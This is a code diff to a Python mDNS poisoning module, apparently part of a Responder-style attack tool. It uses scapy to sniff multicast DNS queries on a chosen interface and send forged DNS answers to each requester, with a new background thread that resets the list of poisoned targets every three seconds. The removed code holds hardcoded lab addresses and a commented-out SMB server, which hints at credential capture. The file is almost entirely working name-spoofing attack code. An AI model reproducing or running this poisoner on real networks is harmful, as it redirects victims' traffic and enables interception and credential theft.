@@ -4,25 +4,22 @@
 
 from scapy.all import DNSRR, DNS, Ether, IP, UDP, sendp, sniff, packet, IPv6
 from .poisoninfo import PoisonNetworkInfo
+import time
+from threading import Thread
 
 
 class MDNS(PoisonNetworkInfo):
     def __init__(self, ip: str, ipv6: str, mac_address: str, iface: str):
         super().__init__(ip, ipv6, mac_address, iface)
         self._targets_used = []
-        self._mdns_poisoner_process = None
 
     @property
     def targets_used(self):
         return self._targets_used
 
-    @property
-    def mdns_poisoner_process(self):
-        return self._mdns_poisoner_process
-
-    @mdns_poisoner_process.setter
-    def mdns_poisoner_process(self, process):
-        self._mdns_poisoner_process = process
+    @targets_used.setter
+    def targets_used(self, ip):
+        self.targets_used.append(ip)
 
     def dns_record(self, pkt: packet) -> DNSRR:
         return DNSRR(
@@ -75,10 +72,10 @@ class MDNS(PoisonNetworkInfo):
         return response
 
     def send_packet(self, response: packet, ip_of_the_packet: str) -> None:
-        # if ip_of_the_packet not in self.targets_used:
-        print("Sending packet to " + ip_of_the_packet)
-        sendp(response, verbose=False)
-        self.targets_used.append(ip_of_the_packet)
+        if ip_of_the_packet not in self.targets_used:
+            print("Sending packet to " + ip_of_the_packet)
+            sendp(response, verbose=False)
+            self.targets_used = ip_of_the_packet
 
     def filter_for_mdns(self, pkt: packet) -> bool:
         return (
@@ -98,6 +95,9 @@ class MDNS(PoisonNetworkInfo):
     def start_mdns_poisoning(self) -> None:
         # Port of mdns 5353
         # filter="udp and port mdns",
+        cleaner_trhead = Thread(target=self.cleaner)
+        cleaner_trhead.daemon = True
+        cleaner_trhead.start()
         sniff(
             filter="udp and port mdns",
             iface=self.iface,
@@ -106,30 +106,6 @@ class MDNS(PoisonNetworkInfo):
         )
 
     def cleaner(self):
-        print("Empezando sleeper...")
         while True:
             time.sleep(3)
             self.targets_used.clear()
-
-
-def startPoison():
-    try:
-        ipv6 = "fe80::20c:29ff:fe89:df69"
-        ip = "192.168.253.135"
-        ether = "00:0c:29:89:df:69"
-        iface = "ens33"
-
-        MDNSPoison = threading.Thread(target=mdnsPoison, args=(ipv6, ip, ether, iface))
-        MDNSPoison.daemon = True
-        MDNSPoison.start()
-        # server = threading.Thread(target=startSMBServer)
-        # server.daemon = True
-        # server.start()
-        sleeper = threading.Thread(target=cleaner)
-        sleeper.daemon = True
-        sleeper.start()
-        # server.join()
-        MDNSPoison.join()
-        sleeper.join()
-    except KeyboardInterrupt:
-        print("Saliendo ...")
